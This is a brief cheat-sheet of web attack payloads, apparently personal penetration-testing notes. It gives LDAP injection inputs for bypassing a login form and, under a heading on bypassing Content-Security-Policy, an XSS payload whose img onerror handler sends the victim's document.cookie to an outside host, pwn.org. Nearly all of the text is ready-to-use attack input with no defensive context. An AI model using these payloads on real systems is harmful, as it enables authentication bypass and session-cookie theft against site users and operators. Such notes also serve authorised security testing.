
# LDAP Injection

[ldap_injection](https://wiki.zenk-security.com/doku.php?id=failles_web:ldap_injection)

username: *))%00
password: whatever

username: *
password: *)(&

# Bypass Content-Security-Policy

>'unsafe-inline' :

	using inline script tag : `<script>/*some stuff*/</script>`

	if its blocked we can just use : `<img src onerror="location.href='//pwn.org/index.php?content='.concat(document.cookie);">`